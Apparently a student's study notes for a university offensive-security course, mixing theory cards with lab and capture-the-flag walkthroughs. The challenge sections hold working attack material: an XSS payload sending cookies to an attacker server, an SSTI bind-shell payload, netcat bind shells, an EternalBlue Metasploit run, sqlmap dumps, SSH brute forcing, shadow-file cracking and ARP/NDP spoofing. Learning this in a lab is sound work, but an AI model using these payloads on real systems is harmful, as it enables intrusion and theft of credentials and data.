- TODO 
    - Scan more ports with script? `-p-` (Or add advanced scan for single hosts as extra script?)
        - -R for reverse lookup?
    - Wie nochmal byte payload angeben? 
    - ipv6 missing
    - Moodle Musterlösungen kopieren & verstehen
    - Register Cheatsheet
        - ![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/Ox04CloSlU5zDXbqQr2bZbgKJdV1J_HKAsvTMy5dKVWijqihtmcwQ2Ee25elLH0HDbuxbjvxRTyHT3XmhNcc2NMolozs14fUu0Eu_D3NxA2AbL5g2q0IAqXKHiE1PkYn.png)
    - ndp-spoof
- General
    - Linpeas ([PEASS-ng/linPEAS at master · carlospolop/PEASS-ng · GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS?aliasId=todbZTFAmZBfFAaTf?isPin=false) )
        - Transfer to target machine via `nc`
            - Victim: `nc -l 4444 > linpeas.sh`
            - Attacker: `nc $TARGET_HOST 4444 < /usr/share/peass/linpeas/linpeas.sh`
        - Oder expose via python webserver and user `wget` or `curl` 
            - Auch praktisch für lange reverse shells
    - `printenv`
    - `.bash_history`
    - `grep -r cip{` (under /)
    - sql injection
        - [SQL Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- Network Scanning
    - Reachability (fast)
        - `nmap 10.183.0.1/24 -T4 -sP` 
    - Singe Machine
        - `sudo nmap -T4 -p- --max-hostgroup=10 --max-parallelism=10 <HOST/NETWORK>` 
    - IPv4
        - `sudo nmap -T4 --max-hostgroup=10 --max-parallelism=10 <HOST/NETWORK>` 
        - This command runs a ping scan thus sends ICMP packets. ARP is used for locally via ethernet reachable hosts.
        - nmap might also resort to the usage of a TCP SYN packet to port 443, a TCP ACK packet to port 80 and an ICMP timestamp request.
    - IPv6
        - `sudo nmap -6 -T4 --max-hostgroup=10 --max-parallelism=10 <HOST/NETWORK>` 
        - Same as before besides ARP. This usually does not work for large subnets since there are just way to many possible ips in that search space.
        - `sudo scan6 -i eth0 -L`
        - This command utilizes the NDP protocol.
    - Beispielplan
        - ![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/dRmMJoLVJvvdkpCcYtjw3hbHgRjRP3dRwjQou7cM7p-w08dkdlgovQSAMOnF9hFjNrGCCoZZRPU_h6fP5OU_n2aSBkI87yWadOvuAMSdj92BfcuxSQ1oOGQA2Cpwu8wK.png)
- Network Scanning 
    - Selber Tool schreiben?
    - Host Discovery
        - Sources
            - Passive Reconnaissance
            - Listening for network packets (broadcast packages, ARP, NDP, ...)
        - Active Scan
            - Ping scan: `nmap -sn <network>` 
            - `scan6` 
                - IPv6 search space
                - Discover using NDP
            - `arp-scan`
                - send ARP probes for a range of addresses (check responses)
            - TCP/UDP scans: Listen for responses on ports `nmap -Pn <>` (`-Pn` just skips the ping)
        - Determine host names using reverse DNS (`dig -x` , `nslookup` )
        - Demo commands:
            - `nmap -sn 10.132.0.0/24`
            - `nmap -sn -6 fd50:52:132::/120`
            - `scan6 -i eth1 -L | tee -a hosts6` 
            - `scan6 -i eth1 -d fd50:52:132::/120 | tee -a hosts6` 
    - Service Discovery 
        - `nmap <>`
            - Checks if host is up via ping scan
            - Assume host is up and skip ping scan with  `-Pn` 
            - Perform TCP SYN scan (`-sS`) top 1000 ports
                - Stealthy: No handshake completion
                - Can be usded ofr service discorvery
- Common Exploits 
    - XSS
        - Cross Site Scripting
        - **Basic Idea:** Inject Javascript code on a website that somebody else loads, then it gets executed on their machine when opening it
        - **Example Use:** 
            - open local server `$python3 -m http.server --bind 10.181.0.203` 
            - inject javascript into site, for example via a "send us a message" system 
`<img src=x onerror='payload="http://10.181.0.203:8080/?data=" + document.cookie; fetch(payload)'>` 
            - get all their cookies sent to your server and profit
    - SSTI
        - Server-Side Template Injection
        - **Basic Idea:** Templates are rendered server-side and potentially allow execution of (almost) arbitrary code 
        - **Example Use:**  [A Simple Flask (Jinja2) Server-Side Template Injection (SSTI) Example](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/) 
- Challenges 
    - DokuWiki (RCE) (10.183.162.45)
        1. Flag
            1. /install.php öffnen
            2. mal installieren, mit uns als admin
            3. öffnen und einloggen, bam, sind admin
            4. Example Plugin ansehen
        2. Flag
            1. wenn remote-code-execution, und auf dem webserver mehrere seiten liegen, können wir uns verbreiten
            2. im extension manager extentions hochladen
                - php files, die vom webserver ausgeführt werden
            3. admin example plugin
                - darauf aufbauend: eigenes malicious plugin bauen, hochladen, übernehmen
                - `base64 -d > unknown {paste shit here}` (its a zip `file`)
                    - `unzip` 
                - `binwalk/file` findet auch raus, was für typen datein haben
            4. bindshell statt reverse-shell, weil wir nicht davon ausgehen können, das server aus dem servernetz raus telefonieren dürfen 
                - [Online - Reverse Shell Generator](https://www.revshells.com/) (bind shell here)
                    - `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f` 
            5. (ohne bind/reverse-shell: mit php shell einrichten, über den browser dann)
            6. Es gibt im Startverzeichnis eine Datei die nicht Standard ist (`submit-backup`)
            7. Man lädt diese Datei rüber
                1. Es handelt sich um einen Webserver, also einfach Pfad angeben
            8. Betrachtung mit Ghidra zeigt, dass credentials beim Befehlsauruf als cli Argumente übergeben werden
            9. Man macht eine zweite Bindshell auf und guckt, während der Ausführung von  `submit-backup` , welche Argumente übergeben werden
                1. Bindshell in der vorhandenen Bindshell starten
                    1. `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4445 > /tmp/f &` (& - startet im Hintergrund)
                    2. `submit-backup` starten
                    3. `ps x` gleichzeitg
                    4. profit
        - Archived
            - /install.php
            - Plugins for RCE (Example plugin)
            - Override admin.php
            - env Variablen unterscheiden sich Prozessweise und werden vererbt
                - Findet man auch unter /proc/self/environ
    - Storylistener (10.183.162.31) - Siehe Moodle?
        - Ausführlicher Portscan
            - `sudo nmap -T4 -p- --max-hostgroup=10 --max-parallelism=10 10.183.162.31` 
        1. Flag
            1. `telnet | tee output` 
            2. Special characters clearen Terminal
        2. Flag
            1. "debug_output" via nc (add \r to \n) (Default behaviour of `telnet`)
            2. Tee ouput into file
            3. `binwalk -e --dd=.*` on file 
        - wireshark packets anschauen
            - hier sieht man viel mehr ausgaben, als was man im terminal sieht
            - auf ein Paket der Verbindung; follow TCP stream; fenster auf; als binary; nur vom server zum client; bam binary; binwalk -D drüber
        - darauf dann ghidra werfen
        - react anschauen
        - buffer overflow finden
            - gibt keine stack canaries
            - stack is executable
        - pwntools checksec draufwerfen
        - http 0.9
    - Rogers PC (10.183.0.144) 
        - Machine Access
            - Using metasploit [GitHub](https://github.com/rapid7/metasploit-framework?aliasId=WVurkDeKVlA6gSdpa) the "EternalBlue" exploit can be run to get access to Rogers account (machine will crash after exploit and has to be restartet by tutors)
                - run metasploit: `msfconsole` 
                - (search through database `search` || search online for exploits (CVE))
                - Select module: `use exploit/windows/smb/ms17_010_eternalblue` 
                - (check options: `options` && especially check for payloads: `show payloads` (here no shell but VNC server for gui interaction))
                - Set required options
                    - ```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 69
payload => windows/x64/vncinject/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.183.0.144
rhosts => 10.183.0.144
msf6 exploit(windows/smb/ms17_010_eternalblue) > set viewonly false
viewonly => false
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

``` 
        1. Flag
            1. In documents directory
        2. Flag
            1. Wallpaper name refers to windows registry
            2. run `regedit.exe` 
            3. Go to wallpaper key and modify value to find flag
        3. Transfer Flag
            1. On Kali host start http server `python -m http.server` 
            2. From windows run Internet Explorer and enter in the URL the following: `http://$KALI_IP/flag` 
            3. Request will be visible in webserver logs and therefore flag
        - Archived
            - [RDP Testen & Angreifen
](https://www.heise.de/hintergrund/Remote-Desktop-via-RDP-Testen-und-angreifen-3-4-4702968.html?aliasId=b9GzGTyRJsdKoUtPQ)
            - ```bash
└─$ ./rdpscan 10.183.0.144
10.183.0.144 - VULNERABLE - got appid

``` 
            - [NVD - cve-2019-0708](https://nvd.nist.gov/vuln/detail/cve-2019-0708)
            - .
                ```
                nmap -P0 -p 3389 --script rdp-enum-encryption 10.181.0.144
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-18 16:00 CET
Nmap scan report for 10.181.0.144
Host is up (0.014s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|     Native RDP: SUCCESS
|     RDSTLS: SUCCESS
|     SSL: SUCCESS
|   RDP Encryption level: Client Compatible
|     40-bit RC4: SUCCESS
|     56-bit RC4: SUCCESS
|     128-bit RC4: SUCCESS
|     FIPS 140-1: SUCCESS
|_  RDP Protocol Version:  RDP 5.x, 6.x, 7.x, or 8.x server

Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds 
                ```
            - Man kann die Benutzerauswahl aufrufen & Sicherheitsprotokoll erzwingen
                - `xfreerdp /sec:rdp /v:10.183.0.144 /u:` 
    - Nextcloud 
        - webserver root directory feststellen
        - erkennen, dass paths ausgeliefert werden
        - gobuster rüber fahren lassen
            - `gobuster dir -e --extensions=html,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 10 --url=http://10.183.0.114/data/santa/files/`
            - Nicht zu viele Threads nutzen
        - Das Verzeichnis mit den Bildern finden
            - Dort nach vorgegebenen Format nochmal mit gobuster rüber knattern
            - dann bei den bildern nach metadaten suchen: `exiftool -F ./pictures/ -w metadata`    
    - Jukebox 
        - Jinja Template Injection: [Jinja2 SSTI - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti?isPin=false?aliasId=EjKyScx2bQumP3OXE) (via url parameter)
            - bind shell:
                - victim:
                    - `{{ ().__class__.__base__.__subclasses__()[107].load_module("os").popen("ncat --exec /bin/bash -l 4444").read() }}`
                - attacker:
                    - `nc jukebox.user.scenario.cip.institute 4444` (`-k` for multiple connections)
                    - Full TTY: [Full TTYs - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys?isPin=false?aliasId=HZA5ygURlV8ZHzWU3)
                        - .
                            ```
                            ```
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
                            ```
                - Environmentvariablen: `printenv`
    - Script Kiddies 
        - Cross Site Scripting
            - payload `<img src="_" onerror="fetch('http://10.183.0.215:8000/?data=' + document.cookies)">` 
    - Jimmys Desktop 
        - Conncection via RDP
            - `xfreerdp /v:jimmys-desktop.user.scenario.cip.institute /u:jimmy /p:jimmy`
        1. Flag
            1. Found password hashes in `.passwords`
            2. Found encryption information in `.bash_history`
                1. Decrypted via: `openssl enc -d -aes-256-cbc -pbkdf2 -base64 -k secretpassword123 -in passwords.txt -out passwords.decrypted.txt`
        2. Flag
            1. Openend presentation (`~/Documents`)
            2. Found flag on slides
        3. Flag
            1. Run linpeas (See **general)**
            2. Found out that `sudo hping3` could be run without sudo password
                1. hping3 basically grants a root shell
        4. Flag
            1. Check Firefox for passwords (not default master password)
    - Mailserver 
        - Flag
            - Mailcow default creds & Doku über Konfiguration
    - Guestbook (10.181.162.137)
        1. Flag
            1. `sqlmap -u 10.181.162.137 --tables --forms --crawl=2 --random-agent --dump -T flag | tee flagdump.txt` 
            2. nicht zu viele threads, aggressiveness nicht super hoch pumpen, eher seichter rangehen
            3. basically immer den capital letters folgen
            4. [SQLmap Tutorial](https://hackertarget.com/sqlmap-tutorial/#blocked)
            5. danach textaufgabe, keine zeit für so nen shit
        2. Flag
            1. sql: `' UNION SELECT 'flag_value' AS name, text FROM flag'` 
            2. sqlmap: `sqlmap -u [http://10.140.162.137/](http://10.183.162.137/) --sql-shell --forms --flush-session --dbms=SQLite` 
                1. [The Schema Table](https://www.sqlite.org/schematab.html) Information can be found in the "sqlite_schema" table 
    - Cantina (pivot scan) (Star Wars movie) 
        - Default password list: [SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt at master · danielmiessler/SecLists · GitHub](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt?isPin=false?aliasId=nNpvjhbzx4PqQIILw)
        - `hydra -l root -P common-passwords.txt  ssh://10.183.0.106`
        1. Flag
            1. `ls`
        2. Flag
            1. check `.bash_history`
            2. `ip a` ⇒ Interface for hidden subnet found 10.183.2.0/24
            3. `nmap  -p- -sV -T4 --max-hostgroup=10 --max-parallelism=10 -A -sS 10.183.1.111`
            4. `nc 10.183.1.111 1337 | tee movie.txt` (flags can be grepped afterwards (2))
        3. Flag
            1. Check Banner and follow to directory
        4. Flag
            1. `cat /proc/1/environ` for container env vars
    - 10.183.0.156?
    - MitM
        - ARP-spoofing
        - mitmproxy.org
            - Transparent Proxy
            - `bettercap -iface eth1`
            - `mitmproxy` 
        - Mit ca.key eigenes Zertifikat siginieren
            - `certtool` 
    - Webtop (10.183.162.152)
        - Added bind shell script
            - ```bash
$ cat bind_shell.sh
#!/bin/bash

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f

``` 
            - Full TTY
                - ```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset; 
``` 
        1. Flag
            1. `cd /flags` 
        2. Flag
            1. Ran linpeas.sh
                - checked groups
                - found `sudo` 
                    - `sudo su - root` 
                - `cd /home/rockme` 
                    - check `TODO.md`
                    - crack password of user locally
                        - get hash `cat /etc/shadow` 
                        - `john --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt hash.txt ` 
                    - Use on nextcloud machine
        3. Flag
            1. Open firefox
            2. Check URL Bar
    - Keysafe
        - ![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/DV-iJLmPxBQM-QDGkG__ZMicDJRWw6d4IPV_yR31jvfja9tdQXdMmlfYDFIbgAeMNVtjg19jlYxCZ4jZFXM60peOR_zA8wD_soe8WbrQEN7RkFGU4mm1pjNuP-2TQ5g0.png) 
- Practical Tasks in the Exam
    - Start by scanning
    - Pivot Scanning exists, also important for the network plan
    - Roughly 1 hour of just watching and exploring the network
    - Network plan website provides helpful hints
    - 3 apporaches in der Klausur, da müssen wir beschreiben, wie unser Lösungsweg ist. Feedback nicht in der Klausur, aber gibt Punkte
    - Für 1.0
        - 4 easy, 2 medium, 1 hard
    - there are 6 easy, 3 medium, 2 hard
    - Docker 
        - interessanter mount ist bspw. /dev/vda1
        - Priviledge Escalation
        - Disc Mounting von root systemen, wenn wir im docker root sind
            - Du startest neuen container, mountest host system, bam
        - Docker in Docker
        - um mit dem Daemon zu kommunizieren, müssen wir in der Docker gruppe sein
        - Mal schauen, ob der Container in anderen Netzen drin ist
        - Wenn man bspw. ein /home/XXX directory mounten kann, dann kann man dort ein Programm schreiben, dass setuid(0) ausführt und eine shell spawnt. Der Besitzer ist dann root und das setuid-Bit muss gesetzt sein. Dann hinterlegt man einen public ssh key und kann sich als der entsprechende Nutzer verbinden. Man führt das Programm aus und Profit
    - PWNDEBUG
        - wie symbols? 
        - break main
        - checksec
            - gibt security features aus
        - disassemble function
        - break *"function name"+offset
        - x/32 *adresse
        - x/32c lässt es als char interessieren
        - tele adresse
            - gibt stack ab adresse aus
        - readme cheat sheet
        - github.com/pwndebug/pwndebug
        - 
    - Arpspoof
        - sudo arpspoof -i  __interface __ -c both -t  __victimAdress routerAdress__  
        - in /etc/sysctl.conf ip forwarding anmachen
        - nft list ruleset
            - mal in die firewall schauen
            - nft flush ruleset resetted alles
        - Wireshark
            - rechtsclick auf http
            - follow tcp stream
    - wenn die curl insecure flag verwendet wird, kann das interessant sein
    - MITMPROXY
        - Wir wollen eigentlich transparent mode i.d.R.
        - `$ mitmproxy --mode transparent -l -p 8080` 
        - prerouting nat tabelle anpassen, dass mitmproxy die pakete bekommt
            - .
                ```
                table inet nat {
        chain prerouting {
        type nat hook prerouting priority dstnat; policy accept;
        ip daddr ^^victim-partner^^ tcp dport {80, 443} counter dnat to ^^ourselves^^:8080
        }
}
                ```
        - chain prereouting {type nat hook prerouting priority dstnat; policy accept;}
    - Für ipv6 spoof: bettercap
        - enable ipv6 forwarding
        - set router as default gateway
        - firewall rules are dicks again
        - `$ set ndp.spoof.targets #firstIPV6ofVictim #secondIPV6ofVictim #routerIPV6` 
            - manchmal muss man die adressen mal pingen, dann findet er sie
    - How to Firewall
        - enable forwarding
            - ipv4 and ipv6 connectivity check
        - nano /etc/nftables.conf
            - policy drop verwenden, ^^ABER SICH SELBST ERLAUBEN^^ 
                - Das analog auch für output in forwarding chain
                - nftlist ruleset
                - .
                    ```
                    chain input {
    type filter hook input priority filter; policy drop;
    ct state vmap { invalid: drop, established: accept, related: accept}
    tcp port 22 accept
    icmpv6 type { nd-neighbor-solicit, nd-router-advert, nd-neighbor-advert, mdl-listener-query }
}

chain forwarding {
    type filter hook input priority filter; policy drop;
    ct state vmap { invalid: drop, established: accept, related: accept}
    ip daddr <IPv4> tcp dport 81 reject
    ip6 daddr <IPv6> icmpv6 reject #
    ip daddr <IPv4> counter tcp dport 80 accept # accept IPv4 on 80
    ip6 daddr <IPv6> counter accept # allow all IPv6
}

chain output {
    type filter hook input priority filter; policy drop;
    ct state vmap { invalid: drop, established: accept, related: accept}
} 
                    ```
        - `$ tcpdump -vv -n -i any not host < self >` 
            - da mal in die anfragen / authorisation header schauen
- 
- Theory 
    - Some Cards
        - Motivation

            - Hacking↔performing unintended interactions with a system
            - Research↔makes an attack surface visible
            - CIA→Confidentiality, Integrity, Availability
            - Security vs Safety→![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/7rTB8eNliAOY_dwl-lIIsfo5mg3WjvyEMF8P9oB9I7x-WJDK5o0dwVzgSKES_QVc-cU7xXBnmldapudn_9UFjHDSz9Nq3uR2ZSNN6AAG1z6fxFVWNuuMhTXv_J5rbEDB.png)
            - Name three different forms of attack categorization↕ ↓ 
                - MITRE ATT&CK→![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/UHuPc4QI8PNkK1NaJJss6b_-SiRtrQkkYgmvnmjVxCjex_JL8Qno7zDNusKmcoUGgyA47N6f-IMKtrqrpvA0T_wr7JUqmcdgq-V2Hs_nccgUldFbQeY_6busYMihvmFd.png)

                - OWASP Top 10→![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/5B0QQlMmgt6FIKzhQV_pqI5Zpg9SBBBSU58BBsnJfzPxFKNx84UMVCDqflQtsoeV-lDanuYv_jnbypAsT1wX42qgG1ZGcVM_VdQ_2xwYU6QzHTmrz-m0ku7kdpQZIzfT.png)
                - CWE ↓ 
                    - Common Weakness Enumeration
                    - tries to **catalogue and document** disclosed cybersecurity **vulnerabilities** 
                - 
        - Networking Basics
            - Circuit Switching ↓ 
                - guaranteed latency
                - expensive
                - establishes physical link
            - Packet switching ↓ 
                - fewer latency guarantees (fewer assurances in general)
                - best effort
                - cheaper
                - multiplexing possible
            - TCP ↓ 
                - Transmission Control Protocol
                - Full-Duplex
                - Congestion Controlled
                - Connection Based
                - Guarantees order and correctness of packets
            - UDP ↓ 
                - User Datagram Protocol
                - Yeet the baby
                - no guarantees whatsoever
                - no overhead neither
            - Wie funktioniert TCP Verbindungsaufbau?→![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/_euaBd2LtEGV9PNvQQdMqbhsslQp8vstyTY30eCCyjjmbd--c9FfL0pLATYNLHJKJmp23-kU9lZJoGms-kkYvHyPkMy-r4IPdB9Gptw2W5DPeoX3kfgb66Q8HiXlVKSj.png)
            - Wichtige Protokolle und Port ↓ 
                - HTTP→80
                - HTTPS→443
                - SMTP→25
                - SMTPS→587
                - IMAP→143
                - IMAPS→993
                - POP3→110
                - POP3S→995
                - DNS→53
                - DHCP
                - SMB
                - NFS
                - SSH
                - TFTP
            - TLS ↓ 
                - Transport Layer Security
                - Can provide **C** and **I** of CIA
                - Different authentication possibilities
                    - Server authenticates against Client
                    - Client authenticates against Server
        - Hackers and Malware
            - Which Type of Hackers are there? ↓ 
                - White Hat ↓ 
                    - Ethical Hackers
                    - Help Governments and Orgs find vulnerabilities in their systems
                    - eg. by penetration testing etc.
                    - follow the responsible disclosure process
                - Black Hat ↓ 
                    - Try to delete/encrypt or steal data for their own (monetary) purposes
                    - Don't inform the victim about vulnerabilities
                - Grey Hat ↓ 
                    - May violate ethical standards but not for personal profit
                    - Can habe good and bad intentions
                - Sponsored Hackers ↓ 
                    - Work eg. for the three letter agencies
                    - Basically infinite resources
                    - Very advanced tools
            - By which metrics are attacks categorised? ↓ 
                - Targets
                    - individuals
                    - companies
                    - broad attacks
                    - governments
                - Intentions
                    - denial of service
                    - information stealing
                    - exposing
                - Effort
                    - simple, fast, mass produced, automated
                    - advanced
                    - very complex
                - Executing groups
                    - script kiddies
                    - XXXs
                    - hacker groups
            - Link Layer attack scenarios ↓ 
                - Denial of Sleep
                - ARP attacks
            - Internet Layer attack scenarios ↓ 
                - IP-Spoofing
                - ICMP attacks
                - DNS Amplification
                - Routing attacks
                - many many more
            - SSL/TSL attack scenarios ↓ 
                - MITM
                - Downgrade attacks
            - Advanced Persistent Threats ↓ 
                - Advanced
                    - Stealthy and sophisticated methods
                    - Usually involve social engineering
                    - Might involve 0-day exploiits
                    - performed in multiple steps
                - Persistent
                    - Last for a longer time period, maybe even years
                    - Remains undetected
                    - Maintains permanent access to the target environment, usually through lateral movement
                - Threat
                    - Performed by well organised teams using large resources
                    - Supervised by humans
            - Phases of APTs→![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/O1i8XVsI25j8KJxHlrvHtugeDpjK-qxy0X5SYC_-dvl5_SDfLT6uvbhC24cUL3bIetsUSD1i3o3YR-VYSLwdpvhR2hcbKNg6C_olL2HI2jW1r3Y70qNJWH5whXXZ5N1o.png) 
            - Types of Malware ↓ 
                - Virus→autonomously spreads through a computer
                - Trojan→appears as something harmless or useful but is malicious
                - Worm→autonomously spreads through networks
            - How to detect malware? ↓ 
                - Signature based→hash that binary and check against database
                - Anomaly based→Hm, why is steve from account logging in out of russia at 3am?
        - Technical Failure 
            - as compared to what Ivo is doing with his home network, which can be considered human failure
            - Fault ↓ 
                - Root cause of an error
                - May be dormant
                - Leads to an error when activated
            - Error ↓ 
                - Internal state that may lead to a failure
                - Internal to the component
            - Failure ↓ 
                - Deviation from expected behavior
                - Externally observable
            - Errors can propagate through different system components
            - How do **Fault**, **Error**, **Failure **fit into the cybersecurity model?→![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/bST3uRQD0GZ6C_BfLYvPBaScD9wVjt3eFYk6ZLa2ns-nOV-yDw8w5iennfp8fjoTr6bQdvvHJ9ItZBTcH9xumZHXBh6vm8OeKv8FjB5ISCbhgSImGO4-0njGk2zKnhVu.png) 
            - What types of failure are there? ↓ 
                - Crash - service stops completely
                - Timing - no response in specified time frame
                - Omission - no response to some requests
                - Computation/Response - incorrect response or incorrect internal state
                - Byzantine/Arbitrary - anything else that goes wrong
            - Categories of Faults ↓ 
                - Design faults
                    - early protocols that assumed trustworthy networks
                - Implementation faults
                    - bugs
                    - unsecure crypto
                    - missing fallbacks (try-catch)
                - Hardware faults
                    - anything we can't change
                - Administration faults
                    - lack of updates
                    - misconfiguration
                    - old/vulnerable systems
                    - working with unnecessary privileges
                    - not protecting hardware 
        - Human Factors 

            - Types of human factor ↓ 
                - Active - a human does something and fucks up
                    - using that one weird logitech pointer that fucked everything
                - Passive - a human does nothing and fucks up
                    - not updating
                    - not locking devices
                    - not locking rooms
                    - not using secure (and **unpredictable** passwords)
                    - leaving insecure default configs
        - Reverse Engineering

            - Tries to get back information that is lost when going from requirements via design to implementation
            - What can be reverse engineered? ↓ 
                - Hardware
                    - Circuit design
                    - Thermal design
                    - Production processes
                - Software
                    - Source-Code
                    - Process
                    - Algorithms
                - Processes
                    - Development processes
                    - Build process
            - How can we reverse engineer? ↓ 
                - Static
                    - Don't execute
                    - Analyze what may happen
                - Dynamic
                    - Execute
                    - Monitor actual behavior
            - Binary exploitation↔the process of subverting a **compiled application** such that it **violates** some **trust boundary** in a way advantageous to the attacker
        - Sandboxing and Virtualisation
            - Sandbox↔an **isolated environment** that allows the running of programs or execution of files **without affecting** the application, system, or underlying platform
                - Examples
                    - Mail viewer
                    - Browser
                    - phone apps
                    - Containers
                    - Virtual Machines
                    - User access rights on your machine
            - Virtualization↔is the **simulation **of the software and/or hardware upon which other software runs
            - Types of Virtualization→![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/W4kJ_-a_QR4HcUI6vEawsestn5zxCo0Bk1oz9tKrR61ef6FuZFLTCe6yayABC7ZdUnfd-479X6zZxyg94kEq-cnx6eFnm0FeCWezzkhTK8rf8P8trng5-nQzhvYvasid.png)
            - Why needs there be a Ring -1?→So different VMs that use Ring0 instructions don't trip each other up
        - OS Security
            - OS Security↔An **action**, **device**, **procedure**, or **technique **that **reduces **a **threat**, a **vulnerability**, or an **attack **by **eliminating **or **preventing **it, by **minimizing **the **harm **it can cause, or by **discovering **and **reporting **it so that corrective action can be taken.
            - TPM ↓ 
                - Trusted Platform Module
                - Generates randomness
                - Generates and securely stores cryptographic keys
            - User Access Control
                - Linux
                    - Privileged vs unprivileged (uid 0 vs uid ≠ 0)
                    - capabilities allow permissions to threads without full root
                - Windos
                    - more fine grained permission system
                    - NT Authority\System is close equivalent to root
                    - Local Security Policy Manager defines who is allowed to do what
                    - Access Control List→![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/7a9P0BfLioZxtV51hkhJO6p1rGBqhfYzd1KhLlaB9eo8WGT2gdSDwfhEYDCvGLL5rO5Z_C9VcxC9HprYyPraETjgs5ulc6UEaobqEokekN6lUqzIJJNSCZLBgSRwqZGu.png)
                - MacOs
                    - Based on Unix
                    - also has code signing
                    - apps are sandboxed by default
            - Memory Security
                - RELRO→![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/NxptenFTcf2j9Hxbnm6Ex6OwUu_hTcSS-ZWJOZGmlf_oWPKR41mohT2TGiUtE0WErtLQvolsGXeB6H-IqDnbyPlCcViySfNIH2ylbih7R4Am18SYUBwJb3214nJfrbMW.png)
                - ASLR ↓ 
                    - Address Space Layout Randomization
                    - causes address space to be different each time
                    - offset are still the same
                    - called place independent execution as well
                - Data Execution Prevention (DEP) ↓ 
                    - theoretically, anything in ram can be executed
                    - some pages are marked non-executable
                - Stack canaries ↓ 
                    - in the stack of a function, placed directly after the stored registers
                    - checked before returning to see if it was overwritten or not
        - Reconnaissance
            - Reconnaissance↔consists of techniques that involve adversaries actively or passively **gathering information **that can be used to **support targeting**. Such information may include details of the victim organization, infrastructure, or staff/personnel. [...] 
            - Social Engineering↔is the activity of attempting to **manipulate users **or employees to **reveal sensitive data**, obtain **unauthorized access**, or unknowingly **perform fraudulent activity **[...].
    - Recap 
        - Misc
            - TCP Teardown nochmal anschauen
            - Protokollnamen möglicherweise notwendig
            - 802.1X oof
            - Grundsätzlich viel trust im unbekannten Netzwerk (Bsp. ARP spoofing)
            - ![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/BNwpAk_ttnVp5Fkl9KuVUj3rdrfCYNZJAFwSdAZd_Ms3nmQjdZ8dVBC5ba_gTWRee2gHkjxnlMTK6Q_7e2HrJHuW2yDMAjzIgHUC-7MnG5aeyihstswZWPLwTkwmWPkC.png)
            - ![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/Txc4WcrUPqFM0avPSeoDWpPgE4RnbE3ZQ9O9EOGhCVJTOboNbPyOXjLJGfP-bzozTkl0mGolhfLoBEkEsZJghWJuCd2RBGaHEsM9UUisgb3tkuD2HIvsh-E4dSgNG1aR.png)
            - ![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/1VuxvwoBdEcA4bK5DkUv0g0aQxsTCZVBdOkqnUhn5rZLitZ1Q5D4NL6t18rU05rF_GHYnVjYL0rcylb1EBZFl-P0AzkYKf_pWcVHZCCOW1ZMfQxs2fqUqh-e3r0FngqX.png)
            - ![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/JKa1YCnmf3myfUt1Xm1aZk0O1bJjA3zJHoOckTvapBNN6uic-xsuTCd6yV8mwR_r5tj5YGeSGx95gubOVjoSPP__gNL-aHxfwHAi1Rv3VgVPQUtJdXCKROphArk4UXnP.png)
            - 
            - ![](local://C:/Users/hoisc/remnote/remnote-63d97e1a4bbc4c8b7b51bea4/files/eFAUNnfxqWtxvYrNC8YlrCAhDgYPiyDczRYciDP8CnPLC40ALKDzHgsqfd6M5-Fi5YoAbU_-e2Ed-XnYnv96VJAaLJhbYG7Jao6cQZZZ2DHoDpjGvHzDlEvU7XafAYLp.png)
